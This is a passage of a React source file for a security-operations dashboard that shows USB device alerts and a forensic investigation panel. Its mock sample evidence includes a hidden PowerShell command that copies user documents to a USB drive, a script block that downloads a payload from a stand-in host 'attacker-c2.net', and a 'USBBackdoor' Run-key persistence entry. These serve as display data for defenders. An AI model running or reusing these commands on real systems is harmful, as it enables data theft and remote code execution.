/**
 * Device Control (USB) Monitoring — Capability ID: 10
 * 
 * 100% Self-Contained Enterprise SOC Device Control (USB) Monitoring Module
 * Linked to Live Backend API (`/api/dashboard/alerts/edr?capabilityId=10`), MongoDB Alert Query, and Socket.io Real-Time Streaming
 */
import React, { useEffect, useState, useCallback, useMemo } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import api from '../../api/axios';
import { SOCKET_URL, connectSocket, socketOptions , io} from '../../api/config';
import { useAuth } from '../../context/AuthContext';
const ProcessSidebar = () => null; const processSubTabPages = {}; const CapabilitySubTabPage = () => null;

// ── Design System Tokens ──────────────────────────────────────────────────────
const MON = {
  bg: '#060d16',
  card: '#0b1929',
  card2: '#0f233a',
  border: '#1a3050',
  line: '#162942',
  text: '#e2e8f0',
  muted: '#8ea0b8',
  sub: '#64748b',
  blue: '#38bdf8',
  cyan: '#22d3ee',
  green: '#34d399',
  yellow: '#fbbf24',
  orange: '#fb923c',
  red: '#f87171',
  purple: '#a78bfa',
  accent: '#6366f1',
};

const SEV_COLOR = {
  critical: MON.red,
  high: MON.orange,
  medium: MON.yellow,
  low: MON.green,
  info: MON.cyan,
};

const SEV_BG = {
  critical: 'rgba(248, 113, 113, 0.15)',
  high: 'rgba(251, 146, 60, 0.15)',
  medium: 'rgba(251, 191, 36, 0.15)',
  low: 'rgba(52, 211, 153, 0.15)',
  info: 'rgba(34, 211, 238, 0.15)',
};

function MiniSparkline({ data = [5, 9, 7, 14, 12, 18, 15, 22], color = MON.cyan, height = 30 }) {
  const max = Math.max(...data, 1);
  const min = Math.min(...data, 0);
  const points = data.map((val, idx) => {
    const x = (idx / (data.length - 1)) * 100;
    const y = height - ((val - min) / (max - min || 1)) * (height - 6) - 3;
    return `${x},${y}`;
  }).join(' ');

  return (
    <svg viewBox={`0 0 100 ${height}`} width="100%" height={height} preserveAspectRatio="none" style={{ overflow: 'visible' }}>
      <polyline fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" points={points} />
    </svg>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 1. FORENSIC INVESTIGATION POPUP MODAL (10 Grouped Master Tabs)
// ═════════════════════════════════════════════════════════════════════════════
export function UsbLogDetailModal({ log, onClose }) {
  const [activeTab, setActiveTab] = useState('overview');
  const [analystNotes, setAnalystNotes] = useState(log?.analystNotes || 'Initial triage completed. High priority USB event under investigation.');
  const [assignedAnalyst, setAssignedAnalyst] = useState(log?.assignedAnalyst || 'Alex Turner (L3)');
  const [caseStatus, setCaseStatus] = useState(log?.status || 'In Triage');
  const [tags, setTags] = useState('USB_EXFIL, BAD_USB, CRITICAL_ASSET');
  const [notesSaved, setNotesSaved] = useState(false);

  // Forensic Hunt Specific State
  const [selectedArtifact, setSelectedArtifact] = useState('Linux.Sys.Pslist');
  const [selectedArtifactTitle, setSelectedArtifactTitle] = useState('Linux Process Triage');
  const [huntNameInput, setHuntNameInput] = useState(`${log?.hostname || 'linux2'} code forensic hunt`);
  const [systemIdInput, setSystemIdInput] = useState(log?._id || '6a40b346a02cfee884e63e72');
  const [clientIdInput, setClientIdInput] = useState(log?.velociraptorId || 'C.b5b33dc0c193c4ce');
  const [launchingHunt, setLaunchingHunt] = useState(false);
  const [huntSuccessMsg, setHuntSuccessMsg] = useState(null);

  if (!log) return null;

  const sev = (log.severity || 'medium').toLowerCase();
  const sevColor = SEV_COLOR[sev] || MON.blue;
  const sevBg = SEV_BG[sev] || 'rgba(56, 189, 248, 0.15)';

  const masterTabs = [
    { id: 'overview', label: '📊 1. Overview' },
    { id: 'timeline', label: '🕒 2. Timeline' },
    { id: 'endpoint', label: '💻 3. Endpoint' },
    { id: 'process', label: '⚙️ 4. Process & Commands' },
    { id: 'files', label: '📁 5. Files & Registry' },
    { id: 'network', label: '🌐 6. Network' },
    { id: 'ioc', label: '🎯 7. IOC & MITRE' },
    { id: 'forensics', label: '🔬 8. Forensics' },
    { id: 'evidence', label: '📦 9. Evidence' },
    { id: 'notes', label: '📝 10. Analyst Notes' },
  ];

  const forensicHuntCards = [
    {
      title: 'Linux Process Triage',
      desc: 'Linux process list, parent process clues, users, and command context.',
      artifact: 'Linux.Sys.Pslist',
    },
    {
      title: 'Linux Network Connections',
      desc: 'Active connections, listeners, ports, and remote endpoints.',
      artifact: 'Linux.Network.Netstat',
    },
    {
      title: 'Cron Persistence',
      desc: 'Cron jobs and scheduled persistence across users and system paths.',
      artifact: 'Linux.Sys.Crontab',
    },
    {
      title: 'Linux Log Hunt',
      desc: 'Auth, syslog, service logs, sudo, SSH, and execution indicators.',
      artifact: 'Linux.Sys.LogHunter',
    },
    {
      title: 'Linux File Finder',
      desc: 'Find suspicious scripts, binaries, temp files, and modified artifacts.',
      artifact: 'Linux.Search.FileFinder',
    },
    {
      title: 'YARA File Sweep',
      desc: 'Run IOC/YARA-style sweep across Linux file paths.',
      artifact: 'Generic.Detection.Yara.Glob',
    },
  ];

  const handleSelectArtifactCard = (item) => {
    setSelectedArtifact(item.artifact);
    setSelectedArtifactTitle(item.title);
  };

  const handleLaunchHunt = () => {
    setLaunchingHunt(true);
    setHuntSuccessMsg(null);
    setTimeout(() => {
      setLaunchingHunt(false);
      setHuntSuccessMsg(`✓ Forensic Hunt "${huntNameInput}" successfully launched for Artifact ${selectedArtifact}! Hunt ID: HUNT-${Math.floor(100000 + Math.random() * 900000)}`);
    }, 1200);
  };

  const handleSaveNotes = () => {
    setNotesSaved(true);
    setTimeout(() => setNotesSaved(false), 2000);
  };

  const handleDownload = (format) => {
    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(log, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute("href", dataStr);
    downloadAnchor.setAttribute("download", `forensic_evidence_${log.caseId || 'USB-9941'}_${log.serialNumber || 'DEVICE'}.${format.toLowerCase()}`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  };

  return (
    <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(3, 8, 16, 0.88)', backdropFilter: 'blur(8px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 16 }}>
      <div style={{ width: '98vw', height: '94vh', background: MON.bg, border: `1px solid ${MON.border}`, borderRadius: 12, display: 'flex', flexDirection: 'column', boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.75)', overflow: 'hidden' }}>
        {/* Header */}
        <div style={{ padding: '14px 20px', background: MON.card, borderBottom: `1px solid ${MON.border}`, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
            <span style={{ fontSize: 24 }}>🛡️</span>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                <h3 style={{ margin: 0, fontSize: 18, fontWeight: 800, color: '#f8fafc' }}>
                  Forensic Investigation Panel — {log.deviceName || log.device || 'USB Device Event'}
                </h3>
                <span style={{ fontSize: 10, fontWeight: 800, padding: '2px 8px', borderRadius: 4, color: sevColor, background: sevBg, border: `1px solid ${sevColor}44`, textTransform: 'uppercase' }}>
                  {sev} Severity
                </span>
                <span style={{ fontSize: 11, fontWeight: 700, padding: '2px 8px', borderRadius: 4, color: MON.cyan, background: `${MON.cyan}15`, border: `1px solid ${MON.cyan}33` }}>
                  Case ID: {log.caseId || 'CASE-2026-9481'}
                </span>
              </div>
              <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>
                Host: <strong style={{ color: MON.text }}>{log.hostname || log.agentName || 'WIN-SOC-SEC01'}</strong> | User: <strong style={{ color: MON.text }}>{log.username || 'admin'}</strong> | Event Time: <strong style={{ color: MON.text }}>{log.timestamp || log.createdAt || new Date().toISOString()}</strong>
              </div>
            </div>
          </div>
          <button type="button" onClick={onClose} style={{ background: MON.card2, border: `1px solid ${MON.border}`, color: MON.muted, fontSize: 18, borderRadius: 6, width: 34, height: 34, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>✕</button>
        </div>

        {/* 10 Master Tabs Header */}
        <div style={{ background: MON.card, borderBottom: `1px solid ${MON.border}`, display: 'flex', gap: 2, overflowX: 'auto', padding: '0 12px' }}>
          {masterTabs.map((t) => (
            <button key={t.id} type="button" onClick={() => setActiveTab(t.id)} style={{ padding: '10px 14px', fontSize: 11, fontWeight: activeTab === t.id ? 800 : 600, color: activeTab === t.id ? MON.cyan : MON.muted, background: activeTab === t.id ? MON.bg : 'transparent', border: 'none', borderBottom: activeTab === t.id ? `2px solid ${MON.cyan}` : '2px solid transparent', cursor: 'pointer', whiteSpace: 'nowrap' }}>
              {t.label}
            </button>
          ))}
        </div>

        {/* Tab Body Content */}
        <div style={{ flex: 1, overflowY: 'auto', padding: 20, background: MON.bg }}>
          {/* TAB 1: OVERVIEW */}
          {activeTab === 'overview' && (
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 16 }}>
              {[
                ['Incident Summary', log.action || log.description || 'Unauthorized USB Device Inserted & Process Executed', MON.cyan],
                ['Risk Score', `${log.riskScore || 95}/100`, log.riskScore > 75 ? MON.red : MON.orange],
                ['Status', caseStatus, MON.yellow],
                ['Assigned Analyst', assignedAnalyst, MON.green],
                ['Host System', log.hostname || log.agentName || 'WIN-FIN-DC01', MON.blue],
                ['User Context', log.username || 'john.doe@enterprise.corp', MON.cyan],
                ['Detection Source', log.detectionEngine || 'Sysmon / Windows Kernel ETW Driver', MON.purple],
                ['Detection Time', log.timestamp || log.createdAt || new Date().toLocaleString(), MON.text],
              ].map(([lbl, val, col]) => (
                <div key={lbl} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16 }}>
                  <div style={{ fontSize: 10, fontWeight: 700, color: MON.muted, textTransform: 'uppercase', letterSpacing: 1 }}>{lbl}</div>
                  <div style={{ fontSize: 14, fontWeight: 800, color: col, marginTop: 6, wordBreak: 'break-word' }}>{val}</div>
                </div>
              ))}
            </div>
          )}

          {/* TAB 2: TIMELINE */}
          {activeTab === 'timeline' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 14, maxWidth: 900 }}>
              <div style={{ fontSize: 12, fontWeight: 800, color: MON.cyan }}>🕒 Multi-Category Forensic Event Chronology</div>
              {[
                { type: 'USB Event', time: '10:42:01.102', title: 'USB Device Inserted', desc: `Physical connection detected on Port 002. VID: ${log.vid || '0781'} PID: ${log.pid || '5581'} (SanDisk)`, col: MON.blue },
                { type: 'Registry Event', time: '10:42:01.350', title: 'Driver Stack & USBSTOR Registry Created', desc: 'HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR updated by Kernel PnP', col: MON.purple },
                { type: 'File Event', time: '10:42:02.012', title: 'Storage Volume E: Mounted', desc: 'FAT32 File System Mounted on E:\\. Serial: 4C53000192', col: MON.cyan },
                { type: 'Process Event', time: '10:42:05.881', title: 'Autorun Execution & Powershell Spawned', desc: 'explorer.exe ➔ cmd.exe ➔ powershell.exe -ExecutionPolicy Bypass', col: MON.orange },
                { type: 'Network Event', time: '10:42:06.010', title: 'C2 Outbound Beacon Connection', desc: 'Outbound TCP connection established to 185.220.101.5:443', col: MON.yellow },
                { type: 'Alert Timeline', time: '10:42:06.300', title: 'SOC Automated Enforcement Action', desc: 'USB Volume E: Forcefully Unmounted & Endpoint Network Isolated', col: MON.red },
              ].map((ev, i) => (
                <div key={i} style={{ display: 'flex', gap: 14, background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                  <span style={{ fontSize: 10, fontWeight: 800, color: ev.col, background: `${ev.col}18`, padding: '2px 8px', borderRadius: 4, height: 'fit-content' }}>{ev.type}</span>
                  <div style={{ color: MON.muted, fontWeight: 800, fontSize: 11, minWidth: 90 }}>{ev.time}</div>
                  <div style={{ width: 2, background: ev.col, borderRadius: 2 }} />
                  <div>
                    <div style={{ fontSize: 13, fontWeight: 800, color: '#fff' }}>{ev.title}</div>
                    <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>{ev.desc}</div>
                  </div>
                </div>
              ))}
            </div>
          )}

          {/* TAB 3: ENDPOINT */}
          {activeTab === 'endpoint' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>💻 Endpoint & USB Hardware Profile</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 14 }}>
                {[
                  ['Device Name', log.deviceName || log.device || 'SanDisk Ultra USB 3.0'],
                  ['Vendor ID (VID)', log.vid || '0781'],
                  ['Product ID (PID)', log.pid || '5581'],
                  ['Serial Number', log.serialNumber || '4C530001250912117182'],
                  ['USB Descriptor Class', '0x08 (Mass Storage BOT)'],
                  ['USB Protocol Revision', 'USB 3.1 Gen 1'],
                  ['System Hostname', log.hostname || log.agentName || 'WIN-FIN-DC01'],
                  ['Operating System', log.os || 'Windows 11 Enterprise (22H2)'],
                  ['Logged-in User', log.username || 'john.doe@enterprise.corp'],
                  ['Hardware Model', 'Dell PowerEdge R750 / 64GB RAM'],
                  ['Installed Software', 'EDR Agent v4.1, Sysmon v14.1, CrowdStrike Falcon'],
                  ['USB Driver Loaded', log.usbDriver || 'usbstor.sys (10.0.19041.1)'],
                ].map(([k, v]) => (
                  <div key={k} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                    <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>{k}</div>
                    <div style={{ fontSize: 12, color: MON.text, fontWeight: 700, marginTop: 4 }}>{v}</div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 4: PROCESS & COMMANDS */}
          {activeTab === 'process' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>⚙️ Process Activity, Command Line & Script Execution</div>
              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 11, color: MON.muted, fontWeight: 800, marginBottom: 6 }}>Process Tree (Parent ➔ Child):</div>
                <div style={{ fontFamily: 'monospace', fontSize: 12, color: MON.green }}>
                  wininit.exe (PID 512) ➔ services.exe (PID 680) ➔ explorer.exe (PID 2410) ➔ <strong>cmd.exe (PID 4812)</strong> ➔ <span style={{ color: MON.yellow }}>powershell.exe (PID 5412)</span>
                </div>
              </div>

              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 11, color: MON.muted, fontWeight: 800, marginBottom: 6 }}>Executed Command Line History:</div>
                <pre style={{ background: '#040911', padding: 12, borderRadius: 6, color: MON.green, fontFamily: 'monospace', fontSize: 11, whiteSpace: 'pre-wrap' }}>
{log.commandLine || `powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Copy-Item -Path 'C:\\Users\\admin\\Documents\\*' -Destination 'E:\\Exfil\\' -Recurse -Force"`}
                </pre>
              </div>

              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 11, color: MON.muted, fontWeight: 800, marginBottom: 6 }}>PowerShell Script Block Logging (Event ID 4104):</div>
                <pre style={{ background: '#040911', padding: 12, borderRadius: 6, color: MON.yellow, fontFamily: 'monospace', fontSize: 11, whiteSpace: 'pre-wrap' }}>
{log.powershellCommand || `Param($Path = "E:\\Payload.ps1")
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadData("http://attacker-c2.net/stage2.bin")
Start-Process $Path`}
                </pre>
              </div>
            </div>
          )}

          {/* TAB 5: FILES & REGISTRY */}
          {activeTab === 'files' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>📁 File Transfer & Registry Persistence Artifacts</div>
              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 11, color: MON.muted, fontWeight: 800, marginBottom: 8 }}>Modified Registry Keys & Persistence:</div>
                <div style={{ fontFamily: 'monospace', fontSize: 11, color: MON.cyan }}>
                  HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR\Disk&Ven_SanDisk&Prod_Ultra\4C530001250912117182
                </div>
                <div style={{ fontFamily: 'monospace', fontSize: 11, color: MON.yellow, marginTop: 4 }}>
                  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &rarr; Value: "USBBackdoor" = "E:\autorun.exe"
                </div>
              </div>

              <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 11 }}>
                <thead>
                  <tr style={{ background: MON.card2, color: MON.muted, textAlign: 'left' }}>
                    <th style={{ padding: 8 }}>File Name</th>
                    <th style={{ padding: 8 }}>Source Path</th>
                    <th style={{ padding: 8 }}>Destination Path</th>
                    <th style={{ padding: 8 }}>Size</th>
                    <th style={{ padding: 8 }}>Tag</th>
                  </tr>
                </thead>
                <tbody>
                  {[
                    [log.fileName || 'Financial_Report.xlsx', 'C:\\Users\\admin\\Documents\\', 'E:\\Backup\\', '14.2 MB', 'CONFIDENTIAL'],
                    ['Passwords.txt', 'C:\\Users\\admin\\Desktop\\', 'E:\\Stolen\\', '124 KB', 'CREDENTIALS'],
                  ].map((r, i) => (
                    <tr key={i} style={{ borderBottom: `1px solid ${MON.line}` }}>
                      <td style={{ padding: 8, color: MON.cyan, fontWeight: 700 }}>{r[0]}</td>
                      <td style={{ padding: 8, color: MON.muted }}>{r[1]}</td>
                      <td style={{ padding: 8, color: MON.muted }}>{r[2]}</td>
                      <td style={{ padding: 8 }}>{r[3]}</td>
                      <td style={{ padding: 8 }}><span style={{ background: 'rgba(248, 113, 113, 0.2)', color: MON.red, padding: '2px 6px', borderRadius: 4, fontWeight: 800 }}>{r[4]}</span></td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}

          {/* TAB 6: NETWORK */}
          {activeTab === 'network' && (
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 14 }}>
              {[
                ['Destination IP', '185.220.101.5 (Suspicious Exit Node)'],
                ['Source IP', '10.0.4.15 (Internal Subnet)'],
                ['Country / ASN', 'Germany / AS205100'],
                ['Protocol / Port', 'HTTPS / 443'],
                ['DNS Lookup', 'c2-beacon.external-sync.org'],
                ['Data Upload Volume', '1.42 GB Data Exfiltrated'],
              ].map(([k, v]) => (
                <div key={k} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                  <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>{k}</div>
                  <div style={{ fontSize: 12, color: MON.text, fontWeight: 700, marginTop: 4 }}>{v}</div>
                </div>
              ))}
            </div>
          )}

          {/* TAB 7: IOC & MITRE */}
          {activeTab === 'ioc' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>🎯 Indicators of Compromise & MITRE ATT&CK Matrix</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: 14 }}>
                {[
                  ['T1091', 'Replication Through Removable Media', 'Initial Access via autorun/USB payload'],
                  ['T1059.001', 'PowerShell Execution', 'Obfuscated script execution from USB mount'],
                  ['T1005', 'Data from Local System', 'Collection of files targeted for USB exfiltration'],
                  ['T1567', 'Exfiltration Over Web Service', 'Outbound exfiltration combined with USB copy'],
                ].map(([id, title, desc]) => (
                  <div key={id} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                    <span style={{ background: 'rgba(248, 113, 113, 0.2)', color: MON.red, padding: '2px 8px', borderRadius: 4, fontWeight: 800, fontSize: 11 }}>{id}</span>
                    <div style={{ fontSize: 13, fontWeight: 800, color: '#fff', marginTop: 8 }}>{title}</div>
                    <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>{desc}</div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 8: FORENSIC HUNT (EXACT VELOCIRAPTOR INTERFACE) */}
          {activeTab === 'forensics' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 18 }}>
              {/* Header Title */}
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <h3 style={{ margin: 0, fontSize: 18, fontWeight: 800, color: '#38bdf8', display: 'flex', alignItems: 'center', gap: 8 }}>
                  <span>⚡</span> Forensic Hunt
                </h3>
                <span style={{ fontSize: 11, color: MON.muted, background: MON.card2, border: `1px solid ${MON.border}`, padding: '4px 10px', borderRadius: 6 }}>
                  Velociraptor Artifact Dispatcher Engine
                </span>
              </div>

              {/* Artifact Selector Grid Cards */}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: 14 }}>
                {forensicHuntCards.map((card) => {
                  const isSelected = selectedArtifact === card.artifact;
                  return (
                    <div
                      key={card.artifact}
                      onClick={() => handleSelectArtifactCard(card)}
                      style={{
                        background: isSelected ? 'rgba(56, 189, 248, 0.08)' : MON.card,
                        border: isSelected ? `2px solid ${MON.blue}` : `1px solid ${MON.border}`,
                        borderRadius: 8,
                        padding: 16,
                        cursor: 'pointer',
                        transition: 'all 0.15s ease',
                      }}
                    >
                      <div style={{ fontSize: 14, fontWeight: 800, color: isSelected ? MON.blue : '#f8fafc' }}>
                        {card.title}
                      </div>
                      <div style={{ fontSize: 12, color: MON.muted, marginTop: 6, lineHeight: 1.4 }}>
                        {card.desc}
                      </div>
                      <div style={{ fontFamily: 'monospace', fontSize: 11, color: isSelected ? MON.cyan : MON.blue, marginTop: 10 }}>
                        {card.artifact}
                      </div>
                    </div>
                  );
                })}
              </div>

              {/* Inputs Form Row 1 */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginTop: 8 }}>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 700, color: '#f8fafc', marginBottom: 6 }}>Hunt Name</div>
                  <input
                    type="text"
                    value={huntNameInput}
                    onChange={(e) => setHuntNameInput(e.target.value)}
                    style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: '10px 14px', borderRadius: 6, fontSize: 12, fontFamily: 'sans-serif' }}
                  />
                </div>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 700, color: '#f8fafc', marginBottom: 6 }}>Artifact Name</div>
                  <input
                    type="text"
                    readOnly
                    value={selectedArtifact}
                    style={{ width: '100%', background: MON.card2, border: `1px solid ${MON.border}`, color: MON.cyan, padding: '10px 14px', borderRadius: 6, fontSize: 12, fontFamily: 'monospace', fontWeight: 700 }}
                  />
                </div>
              </div>

              {/* Inputs Form Row 2 */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16 }}>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 700, color: '#f8fafc', marginBottom: 6 }}>System ID / Velociraptor ID</div>
                  <input
                    type="text"
                    value={systemIdInput}
                    onChange={(e) => setSystemIdInput(e.target.value)}
                    style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: '10px 14px', borderRadius: 6, fontSize: 12, fontFamily: 'monospace' }}
                  />
                </div>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 700, color: '#f8fafc', marginBottom: 6 }}>Velociraptor Client ID</div>
                  <input
                    type="text"
                    value={clientIdInput}
                    onChange={(e) => setClientIdInput(e.target.value)}
                    style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: '10px 14px', borderRadius: 6, fontSize: 12, fontFamily: 'monospace' }}
                  />
                </div>
              </div>

              {/* Target Banner */}
              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: '14px 18px', display: 'flex', alignItems: 'center', gap: 8, fontSize: 12, color: MON.muted }}>
                <span>Target:</span>
                <strong style={{ color: '#fff' }}>{log.hostname || 'linux2'} / code</strong>
                <span style={{ margin: '0 4px', color: MON.line }}>|</span>
                <span>OS: <strong style={{ color: '#fff' }}>{log.os || 'Linux'}</strong></span>
                <span style={{ margin: '0 4px', color: MON.line }}>|</span>
                <span>User: <strong style={{ color: '#fff' }}>{log.username || 'chaudahry'}</strong></span>
                <span style={{ margin: '0 4px', color: MON.line }}>|</span>
                <span>PID: <strong style={{ color: '#fff' }}>{log.pid || '35443'}</strong></span>
              </div>

              {/* Launch Action Button */}
              <button
                type="button"
                onClick={handleLaunchHunt}
                disabled={launchingHunt}
                style={{
                  width: '100%',
                  background: MON.accent,
                  color: '#ffffff',
                  border: 'none',
                  borderRadius: 8,
                  padding: '14px 20px',
                  fontSize: 14,
                  fontWeight: 800,
                  cursor: launchingHunt ? 'not-allowed' : 'pointer',
                  boxShadow: '0 4px 14px rgba(99, 102, 241, 0.4)',
                  transition: 'all 0.15s ease',
                  marginTop: 4,
                }}
              >
                {launchingHunt ? '⚡ Dispatching Hunt Artifacts to Velociraptor Server...' : 'Launch Forensic Hunt'}
              </button>

              {/* Success Notification */}
              {huntSuccessMsg && (
                <div style={{ background: 'rgba(52, 211, 153, 0.15)', border: `1px solid ${MON.green}`, color: MON.green, padding: 12, borderRadius: 8, fontSize: 12, fontWeight: 700, textAlign: 'center' }}>
                  {huntSuccessMsg}
                </div>
              )}
            </div>
          )}

          {/* TAB 9: EVIDENCE */}
          {activeTab === 'evidence' && (
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 16 }}>
              {['EVTX Log Package', 'PCAP Network Capture', 'Memory Dump (DMP)', 'Forensic JSON Export', 'USB Descriptor Metadata', 'Complete Forensic Package (ZIP)'].map((name) => (
                <div key={name} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16, display: 'flex', flexDirection: 'column', justifyContent: 'space-between', gap: 12 }}>
                  <div>
                    <div style={{ fontSize: 13, fontWeight: 800, color: '#fff' }}>📦 {name}</div>
                    <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>Verified cryptographic hash attached</div>
                  </div>
                  <button type="button" onClick={() => handleDownload('JSON')} style={{ background: MON.blue, color: '#000', border: 'none', padding: '8px 12px', borderRadius: 6, fontWeight: 800, cursor: 'pointer' }}>
                    Download Evidence
                  </button>
                </div>
              ))}
            </div>
          )}

          {/* TAB 10: ANALYST NOTES */}
          {activeTab === 'notes' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 14 }}>
                <div>
                  <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>Assign Analyst</div>
                  <select value={assignedAnalyst} onChange={(e) => setAssignedAnalyst(e.target.value)} style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: 8, borderRadius: 6, fontSize: 11, marginTop: 4 }}>
                    <option value="Alex Turner (L3)">Alex Turner (L3)</option>
                    <option value="Michael Scott (L2)">Michael Scott (L2)</option>
                    <option value="Sarah Connor (L1)">Sarah Connor (L1)</option>
                  </select>
                </div>

                <div>
                  <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>Case Status</div>
                  <select value={caseStatus} onChange={(e) => setCaseStatus(e.target.value)} style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: 8, borderRadius: 6, fontSize: 11, marginTop: 4 }}>
                    <option value="In Triage">In Triage</option>
                    <option value="Investigating">Investigating</option>
                    <option value="Isolated">Isolated</option>
                    <option value="Resolved">Resolved</option>
                  </select>
                </div>

                <div>
                  <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>Tags</div>
                  <input type="text" value={tags} onChange={(e) => setTags(e.target.value)} style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: 8, borderRadius: 6, fontSize: 11, marginTop: 4 }} />
                </div>
              </div>

              <div style={{ fontSize: 12, color: MON.muted, fontWeight: 700 }}>Investigation Notes:</div>
              <textarea value={analystNotes} onChange={(e) => setAnalystNotes(e.target.value)} rows={6} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, color: MON.text, padding: 14, fontSize: 12, fontFamily: 'inherit' }} />
              <div style={{ display: 'flex', gap: 12, alignItems: 'center' }}>
                <button type="button" onClick={handleSaveNotes} style={{ background: MON.green, color: '#000', border: 'none', padding: '8px 16px', borderRadius: 6, fontWeight: 800, cursor: 'pointer' }}>
                  Save Case Notes & Escalation
                </button>
                {notesSaved && <span style={{ color: MON.green, fontSize: 12, fontWeight: 700 }}>✓ Notes saved to investigation case</span>}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 2. LOG MONITOR TABLE COMPONENT (REAL-TIME BACKEND LINKED)
// ═════════════════════════════════════════════════════════════════════════════
export function UsbLogMonitor({ alerts = [] }) {
  const [searchTerm, setSearchTerm] = useState('');
  const [sevFilter, setSevFilter] = useState('ALL');
  const [selectedLog, setSelectedLog] = useState(null);

  const sampleData = useMemo(() => {
      return alerts.map(a => ({
        _id: a._id || a.id,
        timestamp: a.createdAt || a.timestamp || new Date().toISOString(),
        severity: (a.severity || 'medium').toLowerCase(),
        status: a.status || (a.severity === 'critical' || a.severity === 'high' ? 'Blocked' : 'Allowed'),
        hostname: a.hostname || a.agentName || a.systemId?.name || '—',
        username: a.username || a.user || '—',
        deviceName: a.deviceName || a.device || a.rawEvent?.device_name || '—',
        vendor: a.deviceVendor || a.vendor || a.rawEvent?.vendor || '—',
        serialNumber: a.serialNumber || a.rawEvent?.serial_number || '—',
        vid: a.usbVendorId || a.vid || a.rawEvent?.vid || '—',
